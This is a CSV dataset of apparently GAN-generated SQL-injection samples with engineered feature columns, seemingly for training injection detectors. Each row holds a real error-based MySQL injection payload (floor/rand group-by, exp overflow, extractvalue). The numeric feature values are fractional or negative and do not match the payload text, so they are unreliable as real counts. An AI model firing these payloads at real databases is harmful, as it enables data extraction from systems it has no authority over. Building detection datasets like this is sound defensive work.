id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000217,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.181121151283211,269.8128356933594,82.68058776855469,41.36177444458008,101.36699676513672,1.9490476846694946,83.5936050415039,37.370845794677734,1.0488675832748413,0.2925267219543457,0.165556862950325,0.387979656457901,0.12336805462837219,3.8164844512939453,1.6520696878433228,0.6424020528793335,0.547600269317627,0.0734867975115776,-0.016321823000907898,-0.0073078470304608345,9.909087181091309,9.93576717376709,4.271615505218506,0.006360776722431183,1.7544962167739868,0.20788000524044037,-0.060383472591638565,0.1328107714653015,0.035926252603530884,0.9815189242362976,0.16876497864723206,-0.03632039576768875,2.172243118286133,-0.07080067694187164,0.3240213692188263,2.134606122970581,7.854535102844238,0.9703716039657593,2.747525215148926,0.6054667830467224,0.3895958662033081,0.881974458694458,0.02937883883714676,0.014015845954418182,-0.014029815793037415,0.09758057445287704,0.07277333736419678,0.23369811475276947,0.3360629081726074,0.39267048239707947,0.11846969276666641,0.2897287607192993,0.14782503247261047,-0.05906597897410393,0.42648568749427795,0.067780502140522,0.17775003612041473,0.018302686512470245,0.015420801937580109,0.3840290606021881,-0.021071061491966248,0.047587424516677856,0.10969680547714233,0.12527212500572205,0.06369968503713608,0.01690177619457245,0.7443098425865173,-0.13549980521202087,-0.044539254158735275,-0.0831788033246994,0.06854841113090515,-0.006225563585758209,-0.04478079080581665,0.004165925085544586,0.01440445613116026,-0.05168348178267479,1.092483639717102,0.562214195728302,-0.03317839652299881,0.05664139240980148,0.5133135318756104,9.850361824035645,0.7992605566978455,0.314538836479187,0.029325060546398163,0.7879262566566467,-0.0064791180193424225,0.0864361971616745,0.17677952349185944
GAN_000218,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.2662689279534565,263.65045166015625,75.60466766357422,40.307708740234375,97.37239074707031,-1.2621935606002808,89.3614501953125,39.311180114746094,0.8282288908958435,0.2912769615650177,0.17308902740478516,0.39427486062049866,0.12313584238290787,3.824251890182495,1.5544726848602295,0.7522503137588501,0.3946992754936218,0.1297767609357834,-0.02325151488184929,0.023994427174329758,9.633599281311035,10.216708183288574,3.6389715671539307,0.10148676484823227,1.7653758525848389,0.2522742450237274,-0.1955408751964569,0.13183605670928955,0.11756628751754761,0.8903421759605408,0.3241075873374939,0.001959860324859619,2.0629754066467285,-0.19231154024600983,0.28714463114738464,2.1478753089904785,7.619219779968262,0.9133819937705994,2.7896053791046143,0.7823563814163208,0.30539003014564514,0.8427547812461853,-0.14966264367103577,0.03686351701617241,0.10523785650730133,0.028681844472885132,0.23155026137828827,0.28714519739151,0.28302231431007385,0.3978654742240906,0.13586081564426422,0.29056352376937866,0.07214323431253433,-0.1002640351653099,0.3859686851501465,0.10155398398637772,0.11075140535831451,0.2508782148361206,-0.08439520001411438,0.27700385451316833,0.11260298639535904,0.11637012660503387,0.002628639340400696,0.2113913893699646,0.09625804424285889,0.030706390738487244,0.7185956239700317,0.14310477674007416,-0.2511371076107025,-0.14344999194145203,0.0691773071885109,-0.08175133913755417,-0.05163644999265671,-0.04896342009305954,0.007418898865580559,0.030774906277656555,1.1587347984313965,0.5096729397773743,0.06969770789146423,0.09880461543798447,0.5165529251098633,9.590015411376953,0.8082526922225952,0.26051464676856995,0.007273226045072079,0.8208569288253784,-0.0012779273092746735,0.09380419552326202,-0.015839427709579468
GAN_000219,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,4.998025863790332,265.074951171875,82.02418518066406,39.584442138671875,99.62523651123047,3.921769857406616,81.00189208984375,36.79949951171875,0.9480308890342712,0.3077220022678375,0.16336777806282043,0.3945375382900238,0.12479067593812943,3.8114781379699707,1.4230191707611084,0.5817744731903076,0.39987310767173767,0.05265302211046219,0.049506716430187225,-0.15159785747528076,9.140157699584961,9.867964744567871,3.7045936584472656,0.23476070165634155,1.8501880168914795,0.21592067182064056,-0.06372641772031784,0.19588035345077515,0.08645715564489365,0.8415229916572571,0.11977291107177734,0.05776192247867584,2.021798610687256,-0.02582910843193531,0.29697203636169434,2.0747268199920654,7.461240768432617,1.1348782777786255,2.90199875831604,0.6974848508834839,0.3260292410850525,0.8867070078849792,0.03222985938191414,0.026286400854587555,-0.08339913189411163,-0.028632700443267822,-0.02140914648771286,0.2961757481098175,0.23662912845611572,0.29213884472846985,0.2257421314716339,0.282771497964859,-0.2131502628326416,0.0304107666015625,0.5194133520126343,0.06306321173906326,0.09379889070987701,-0.0837712287902832,0.045619986951351166,0.23856976628303528,-0.07440067827701569,-0.07676178961992264,0.03763187676668167,0.06009529531002045,0.093503937125206,0.03351708501577377,0.7378568649291992,-0.06550364196300507,-0.11700063198804855,-0.1101401150226593,0.22399170696735382,-0.13399344682693481,-0.007870756089687347,-0.10130590945482254,0.010689969174563885,0.04621650278568268,1.063452959060669,0.4973084330558777,0.06935809552669525,0.07957213371992111,0.49418243765830994,9.460451126098633,0.7257410883903503,0.24202226102352142,0.028349129483103752,0.7549247741699219,-0.07405562698841095,-0.14376100897789001,0.016086742281913757
GAN_000220,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.0694344964330575,265.7370300292969,85.86708068847656,40.56787109375,99.2939682006836,2.263908863067627,78.41229248046875,36.6586799621582,1.1304832696914673,0.3048977255821228,0.16301605105400085,0.39342063665390015,0.1259872019290924,3.8053524494171143,1.6993414163589478,0.747503399848938,0.5756035447120667,0.05630556493997574,0.04787557199597359,-0.018794668838381767,9.423857688903809,9.794381141662598,3.9770314693450928,0.13072803616523743,1.8083946704864502,0.19705456495285034,0.09360902011394501,0.2261914312839508,0.14820924401283264,0.9541764855384827,0.16410116851329803,0.058539047837257385,2.066263437271118,0.15518443286418915,0.3034003674983978,2.0231502056121826,7.217759609222412,0.9409149289131165,2.8277812004089355,0.599489152431488,0.4023149609565735,0.8673382997512817,0.13510669767856598,0.02340429276227951,-0.12970063090324402,0.08000686764717102,-0.07790729403495789,0.33455172181129456,0.24146153032779694,0.3064095079898834,0.22505411505699158,0.3525586426258087,-0.10430996119976044,0.02425127476453781,0.47629356384277344,0.08096706122159958,0.15518715977668762,0.0012330040335655212,0.07718922942876816,0.20253914594650269,-0.13080069422721863,0.050260528922080994,0.07158898562192917,0.05543886870145798,0.07839682698249817,-0.02851099707186222,0.7605183124542236,-0.06347072869539261,-0.0291663259267807,-0.13148576021194458,0.16955144703388214,-0.20036986470222473,-0.08039843291044235,0.013664856553077698,0.007096110377460718,0.0625443160533905,1.0149295330047607,0.44754835963249207,0.021674834191799164,0.03394244611263275,0.4383620619773865,9.487859725952148,0.7019639015197754,0.21845604479312897,0.011592737399041653,0.7776662111282349,-0.06835266947746277,-0.03608813136816025,-0.027882635593414307
GAN_000221,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000131,5.240621940171894,270.4888916015625,78.26398468017578,41.18601608276367,103.38738250732422,4.247714519500732,87.32669067382812,35.96892166137695,0.8710496425628662,0.3089156150817871,0.1629747748374939,0.3898273706436157,0.12491269409656525,3.8470919132232666,1.3803417682647705,0.622921884059906,0.42733234167099,0.07244767248630524,0.1098322719335556,-0.03504634648561478,9.21056842803955,10.183302879333496,3.891155481338501,0.24002277851104736,1.8213906288146973,0.2407650500535965,-0.13475245237350464,0.12128837406635284,0.15346579253673553,0.8717912435531616,0.29343149065971375,-0.10194968432188034,2.1002345085144043,-0.11363181471824646,0.28504565358161926,2.0616908073425293,7.691835403442383,1.0611127614974976,2.652980327606201,0.5956276059150696,0.3589542806148529,0.8491326570510864,-0.1403031051158905,0.035486213862895966,-0.030083373188972473,0.03941405564546585,0.07308913767337799,0.2907382845878601,0.34545406699180603,0.3839211165904999,0.2960374355316162,0.29324644804000854,-0.016965076327323914,-0.04294462874531746,0.4322338104248047,0.11995305866003036,0.09574757516384125,0.09631702303886414,-0.019592411816120148,0.1846419870853424,-0.011939145624637604,0.1605064868927002,0.12856683135032654,-0.014368772506713867,0.0662144273519516,-0.023552706465125084,0.6653503179550171,0.12648886442184448,-0.050515368580818176,-0.03941723704338074,-0.012063860893249512,0.019537577405571938,-0.024041764438152313,-0.11785497516393661,0.008986334316432476,-0.03191817179322243,1.0198194980621338,0.47124162316322327,0.27172601222991943,0.08987762778997421,0.46294185519218445,9.561948776245117,0.7979438900947571,0.2598048746585846,0.01664147898554802,0.7780240178108215,0.02900019660592079,0.17254120111465454,0.12708139419555664
GAN_000222,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000131,5.383203575814626,270.7256164550781,79.04873657226562,41.142303466796875,105.96371459960938,0.857343316078186,87.6761703491211,36.904266357421875,0.6601805090904236,0.3165038228034973,0.15595079958438873,0.3942030370235443,0.12211725115776062,3.8436315059661865,1.5044347047805786,0.9334922432899475,0.4838075041770935,0.033971041440963745,0.2865641713142395,-0.04903518408536911,10.053603172302246,10.473496437072754,4.24800443649292,0.28744110465049744,1.7525739669799805,0.2475283294916153,0.005565310828387737,0.04443049058318138,0.12202951312065125,0.9288941025733948,0.11475366353988647,-0.004874847829341888,2.0860259532928467,-0.36791396141052246,0.3330730199813843,2.160100221633911,7.8928351402282715,1.1982492208480835,3.12544846534729,0.5225324630737305,0.38986703753471375,0.8448309898376465,-0.27196118235588074,0.03660104423761368,-0.022703558206558228,-0.0351196825504303,0.02951553463935852,0.2843450903892517,0.37332940101623535,0.4167526662349701,0.22609448432922363,0.2612229585647583,-0.047614917159080505,-0.00721731036901474,0.4335341155529022,0.0519133135676384,0.10116179287433624,-0.017868638038635254,0.013922370970249176,0.3452224135398865,0.22335964441299438,0.16596192121505737,-0.042162247002124786,-0.06265243142843246,0.07657741010189056,0.05483498424291611,0.6387038230895996,0.14852087199687958,-0.16861434280872345,0.04753081500530243,-0.056858599185943604,0.024344900622963905,-0.013394501060247421,-0.19106468558311462,0.019579622894525528,-0.18219338357448578,1.1005553007125854,0.5412861108779907,0.28409987688064575,0.04995078593492508,0.4082842171192169,9.42454719543457,0.8173357248306274,0.22956658899784088,0.01993795484304428,0.814123809337616,0.05194947496056557,0.11619512736797333,0.34821832180023193
GAN_000223,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.126107538870273,269.15606689453125,79.85527038574219,40.46037673950195,102.70582580566406,1.0947250127792358,85.31330871582031,36.757877349853516,0.954322874546051,0.3018023371696472,0.16312094032764435,0.39060884714126587,0.125748410820961,3.815547466278076,1.5101860761642456,0.8996177911758423,0.5135254859924316,0.03950890898704529,-0.042370423674583435,0.019493509083986282,9.196253776550293,10.048482894897461,4.038674831390381,0.20401781797409058,1.8262357711791992,0.17963318526744843,-0.13717789947986603,0.09209276735782623,0.09002628177404404,0.904058575630188,0.227863609790802,0.1042395532131195,2.0145998001098633,-0.18746431171894073,0.3041238784790039,1.998149037361145,7.516670227050781,0.8994662165641785,2.7392897605895996,0.751863956451416,0.28333452343940735,0.8739224672317505,-0.16408157348632812,0.030542144551873207,-0.04683324694633484,0.07516182959079742,-0.013909243047237396,0.30009859800338745,0.2377030849456787,0.3128649890422821,0.17942623794078827,0.36671993136405945,-0.0895649641752243,0.026863805949687958,0.4422544836997986,0.08076322078704834,0.12447747588157654,0.11882704496383667,0.12647506594657898,0.1706116497516632,-0.0005356743931770325,0.1323455423116684,-0.03688477724790573,0.033045850694179535,0.0718783587217331,0.050740018486976624,0.6928194165229797,0.14749665558338165,-0.09941533207893372,0.016234107315540314,0.01698966696858406,-0.0710650086402893,-0.09681353718042374,-0.019633658230304718,0.017335308715701103,0.06935315579175949,1.0681755542755127,0.5015442967414856,0.20643313229084015,0.032453685998916626,0.509815514087677,9.5070219039917,0.7903744578361511,0.2635260820388794,0.00793717335909605,0.7378702163696289,-0.05653933063149452,0.17537899315357208,-0.012466900050640106
GAN_000224,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.31941842555939,264.06317138671875,78.61686706542969,39.2021369934082,99.20108795166016,-0.20415723323822021,90.83038330078125,39.896484375,0.7576642632484436,0.27298834919929504,0.17252801358699799,0.39402490854263306,0.11951208859682083,3.8485171794891357,1.4727519750595093,0.9829824566841125,0.47673994302749634,0.07786056399345398,0.039972007274627686,0.0953613743185997,9.185812950134277,10.551539421081543,3.893174409866333,0.07119794189929962,1.706642985343933,0.2294546663761139,-0.1744747906923294,0.07653743028640747,0.1676817089319229,0.8712638020515442,0.28089115023612976,0.05671350657939911,2.2569751739501953,-0.10397526621818542,0.36300817131996155,1.934274435043335,7.296116352081299,1.022716760635376,2.7604105472564697,0.7475013732910156,0.2902880609035492,0.8849602937698364,-0.08623739331960678,0.04072215408086777,-0.041008345782756805,-0.01274842768907547,0.3997558355331421,0.2863042950630188,0.3369566798210144,0.38077422976493835,0.1261007934808731,0.2427472174167633,0.24860447645187378,-0.17504361271858215,0.331027626991272,0.09817234426736832,0.15131545066833496,0.25595855712890625,-0.04475576430559158,0.2585211396217346,0.06256122142076492,-0.09520325064659119,0.006195448338985443,0.08703888207674026,0.09520848840475082,-0.14867304265499115,0.7264826893806458,-0.014654271304607391,-0.15359364449977875,-0.08759991824626923,0.02741938829421997,-0.21658341586589813,-0.1058269664645195,-0.03728494793176651,0.005271258298307657,-0.03196750208735466,1.324597954750061,0.5196210741996765,-0.008177489042282104,0.07358235865831375,0.5420535206794739,8.943570137023926,0.8067975640296936,0.27946269512176514,0.007860790006816387,0.817596435546875,0.16420847177505493,-0.1360822468996048,0.059211477637290955
GAN_000225,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.1268403907148095,267.7746276855469,83.04901885986328,41.174373626708984,97.59734344482422,3.6278090476989746,79.46035766601562,36.55615997314453,1.2306575775146484,0.299076646566391,0.1619476079940796,0.39449527859687805,0.12500639259815216,3.7806906700134277,1.5729293823242188,0.6796633005142212,0.5956845879554749,0.09116808325052261,0.019727522507309914,-0.1885700821876526,9.327271461486816,9.744546890258789,3.720074415206909,0.2509409487247467,1.8339455127716064,0.2237495630979538,-0.005765608511865139,0.23812615871429443,0.14437098801136017,0.8272417783737183,0.20733609795570374,0.16292178630828857,2.056727170944214,0.1281001716852188,0.29202646017074585,2.0642364025115967,7.209842681884766,0.8826231956481934,2.707634687423706,0.6763158440589905,0.34581923484802246,0.8280284404754639,0.047196611762046814,0.016317883506417274,-0.14106784760951996,-0.0019571781158447266,-0.09497383236885071,0.2869650721549988,0.23224566876888275,0.26902303099632263,0.2070416808128357,0.38392174243927,-0.22484669089317322,0.052677497267723083,0.49447110295295715,0.0984610915184021,0.11914537847042084,0.07949361205101013,0.03167962282896042,0.027007602155208588,-0.06379999220371246,0.21721398830413818,0.1253901571035385,0.054642513394355774,0.0902906060218811,0.000448521226644516,0.7853160500526428,-0.15384037792682648,-0.07110490649938583,-0.15290217101573944,0.13327258825302124,-0.23652991652488708,-0.18435850739479065,-0.02988830953836441,0.01252010278403759,0.2563225328922272,0.9822794198989868,0.4407200217247009,0.13690298795700073,0.040006123483181,0.4589492678642273,9.531150817871094,0.7045579552650452,0.2556305527687073,0.009113341569900513,0.788165271282196,-0.15428799390792847,-0.01055925153195858,-0.01801573485136032
GAN_000226,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000131,5.165479513282964,264.8749694824219,79.01237487792969,41.87680435180664,101.14210510253906,0.06332266330718994,83.71831512451172,36.53184509277344,0.9623655676841736,0.30647221207618713,0.16413898766040802,0.3945103585720062,0.12272640317678452,3.8150622844696045,1.5264649391174316,0.7861301302909851,0.586426854133606,0.11721765995025635,0.18387949466705322,0.06497040390968323,9.47656536102295,10.067767143249512,4.027049541473389,0.15158435702323914,1.7439697980880737,0.29644882678985596,-0.1089429035782814,0.17405380308628082,0.27086248993873596,0.8999078869819641,0.23309990763664246,-0.14847850799560547,2.2831244468688965,-0.07087267935276031,0.2640455663204193,2.138376474380493,7.5242509841918945,1.2276822328567505,2.779716730117798,0.484698623418808,0.35556644201278687,0.7564530968666077,0.0800464004278183,0.035621196031570435,-0.12110794335603714,-0.13637299835681915,0.16394321620464325,0.3593166768550873,0.3781536817550659,0.3469278812408447,0.28396835923194885,0.23601679503917694,-0.05752120912075043,-0.10737296938896179,0.36572039127349854,0.13822945952415466,0.14590924978256226,0.20359490811824799,-0.24040237069129944,0.190073162317276,0.005633212625980377,0.048961199820041656,0.04200560599565506,0.18418452143669128,0.07649484276771545,-0.02380318008363247,0.6981825232505798,-0.09287123382091522,-0.02476319670677185,-0.028065279126167297,0.05522094666957855,-0.24205410480499268,-0.1202603355050087,-0.13815689086914062,0.013553394004702568,0.02934843674302101,1.1213722229003906,0.44446560740470886,0.10844731330871582,0.13947653770446777,0.3806561827659607,9.37855339050293,0.7077387571334839,0.2508004903793335,0.012847356498241425,0.8446164727210999,-0.009396767243742943,-0.20726770162582397,0.1089790016412735
GAN_000227,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.163165242901556,272.67462158203125,80.32601928710938,40.16827392578125,97.86874389648438,1.4175816774368286,85.45720672607422,37.938655853271484,0.87547367811203,0.3013116121292114,0.16963821649551392,0.3917246460914612,0.12628775835037231,3.8347666263580322,1.4865498542785645,0.7298298478126526,0.461299866437912,0.07369836419820786,0.043296605348587036,-0.019454706460237503,9.42880916595459,9.82211971282959,3.8198599815368652,0.1382552981376648,1.7862755060195923,0.19992101192474365,-0.0832437053322792,0.06041763350367546,0.1531069427728653,0.8735391497612,0.2374703288078308,-0.08061468601226807,2.129668951034546,-0.024907929822802544,0.2928211987018585,2.028749942779541,7.405900955200195,1.0562025308609009,2.9436159133911133,0.7284846305847168,0.3461427390575409,0.8272737860679626,-0.043884240090847015,0.03772646561264992,-0.00896095484495163,0.023725613951683044,0.1104971319437027,0.30719420313835144,0.2909862697124481,0.38552331924438477,0.25181010365486145,0.2997753918170929,0.008915498852729797,-0.11572083830833435,0.3835386335849762,0.09722869843244553,0.11069323867559433,0.1393262892961502,0.009483493864536285,0.24036657810211182,-0.1267193704843521,0.04629995673894882,0.12120208889245987,0.0832073763012886,0.08381600677967072,-0.05899008363485336,0.7283886075019836,0.12784859538078308,-0.09145832061767578,-0.0894896388053894,0.13218337297439575,-0.04298444464802742,0.07010488957166672,-0.08432313054800034,0.014020550064742565,0.019907202571630478,1.0352094173431396,0.47072306275367737,0.10610902309417725,0.10913584381341934,0.5129235982894897,9.41766357421875,0.8182828426361084,0.2536461651325226,0.018033679574728012,0.8242055773735046,0.10574744641780853,-0.024117454886436462,0.06159374117851257
GAN_000228,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.22869153348322,264.616943359375,80.70379638671875,40.51248550415039,99.62723541259766,-0.48634183406829834,83.10904693603516,37.07098388671875,0.8100466728210449,0.3055718243122101,0.1652848869562149,0.39672723412513733,0.12312214076519012,3.8248977661132812,1.4253621101379395,0.7607396245002747,0.48767873644828796,0.021141966804862022,0.19164779782295227,0.14490514993667603,9.649348258972168,10.098165512084961,4.2565813064575195,0.14934608340263367,1.737323522567749,0.2084389477968216,-0.007367384620010853,0.21499061584472656,0.19628402590751648,0.7889522910118103,0.16001936793327332,0.03221172094345093,1.8870114088058472,-0.08332033455371857,0.2540695369243622,2.139014482498169,7.524531364440918,1.1999642848968506,2.838266611099243,0.6641891002655029,0.33751076459884644,0.9436362981796265,-0.03916432708501816,0.015577051788568497,-0.02392934262752533,-0.09502376616001129,0.05076400935649872,0.4259283244609833,0.275755912065506,0.3343934118747711,0.24172832071781158,0.3001304268836975,-0.2503902316093445,-0.05457524210214615,0.4326718747615814,0.06662841141223907,0.11147794127464294,0.26814210414886475,-0.03598351031541824,0.33384963870048523,0.042074985802173615,0.12326127290725708,-0.169430673122406,0.07961121201515198,0.10412892699241638,0.1492147445678711,0.6624140739440918,0.018720358610153198,-0.13303261995315552,-0.1703370213508606,0.1234574168920517,-0.32625606656074524,-0.10134313255548477,-0.30594342947006226,0.017690546810626984,0.022458434104919434,1.1434266567230225,0.40509435534477234,0.0884893462061882,0.08398676663637161,0.38847023248672485,9.085564613342285,0.7585010528564453,0.2854418456554413,-0.015083584003150463,0.758876383304596,-0.09432299435138702,-0.19973795115947723,-0.06675751507282257
GAN_000229,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.149457874729524,263.4226379394531,77.1873550415039,41.75908279418945,102.50962829589844,0.7921532392501831,83.99282836914062,36.93592834472656,0.7955912947654724,0.30359628796577454,0.1639600545167923,0.3888815939426422,0.12577569484710693,3.833509922027588,1.5368919372558594,0.5333693623542786,0.5218564867973328,0.06023435667157173,0.07257594168186188,-0.007069007493555546,9.356344223022461,10.198763847351074,3.9684059619903564,0.11780858039855957,1.7789162397384644,0.2606799006462097,-0.096714086830616,0.2111818939447403,0.16735371947288513,0.968665361404419,0.12737728655338287,-0.1477828472852707,2.108621835708618,-0.11325351893901825,0.2975245416164398,2.1328084468841553,8.005358695983887,1.1935049295425415,2.774928569793701,0.466624915599823,0.37587156891822815,0.8618378043174744,0.11831595003604889,0.018159545958042145,-0.012361183762550354,0.05102769657969475,0.14554573595523834,0.27773094177246094,0.3169376850128174,0.35027575492858887,0.23731213808059692,0.28699564933776855,0.035987868905067444,-0.120594322681427,0.41691502928733826,0.09005054831504822,0.15665647387504578,0.06698554009199142,-0.1925795078277588,0.26166895031929016,-0.016118884086608887,-0.07493967562913895,0.010455481708049774,0.12498215585947037,0.06550619006156921,0.05012538284063339,0.6958398222923279,-0.031697243452072144,-0.1294267326593399,-0.009200423955917358,0.03886960446834564,-0.1345200091600418,0.002759236842393875,-0.10623086243867874,0.0009268735884688795,-0.0033749081194400787,1.1289432048797607,0.4354579448699951,0.050085730850696564,0.14466537535190582,0.4420124888420105,9.996417045593262,0.7194433808326721,0.23138739168643951,0.02711782045662403,0.7463345527648926,-0.01287536695599556,-0.03301890939474106,0.05557720363140106
GAN_000230,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",nearest_attack_euclidean,R000095,5.186411015122711,267.9357604980469,78.93559265136719,39.54961395263672,101.79444885253906,2.1785616874694824,86.91313934326172,37.228694915771484,0.9202209711074829,0.2969207763671875,0.16997261345386505,0.3946426808834076,0.12251395732164383,3.812185287475586,1.2338522672653198,0.9696832299232483,0.4930550158023834,0.09390563517808914,0.00863269716501236,0.017563283443450928,9.184488296508789,10.183791160583496,3.700744390487671,0.18785196542739868,1.8164687156677246,0.2360338568687439,-0.14510829746723175,0.10532009601593018,0.16997133195400238,0.8220636248588562,0.2905450463294983,0.08850672841072083,2.1242268085479736,-0.20259825885295868,0.2809995114803314,1.9864473342895508,7.449419021606445,1.0402477979660034,2.7486586570739746,0.7949029803276062,0.23749373853206635,0.8429620862007141,-0.1754167675971985,0.052189357578754425,-0.03798794001340866,-0.16008618474006653,0.13331861793994904,0.32779592275619507,0.29015251994132996,0.3553565442562103,0.21317696571350098,0.24955952167510986,-0.0053754523396492004,0.02469666302204132,0.38574114441871643,0.09846190363168716,0.12508101761341095,0.1686205416917801,0.036774031817913055,0.159379243850708,0.04858031123876572,0.029313825070858,3.068894147872925e-05,0.03093869239091873,0.10281258076429367,-0.07951721549034119,0.7382172346115112,0.1262531578540802,-0.10279949009418488,-0.0046343132853507996,0.10436500608921051,-0.10100449621677399,-0.09832748025655746,-0.1079433485865593,0.022175021469593048,0.058641184121370316,1.1189699172973633,0.5376120805740356,0.14694416522979736,0.08952347934246063,0.5162749886512756,9.1444730758667,0.7657985687255859,0.2594158947467804,0.0069991303607821465,0.7834228873252869,0.013608641922473907,-0.10588838160037994,-0.05288184434175491
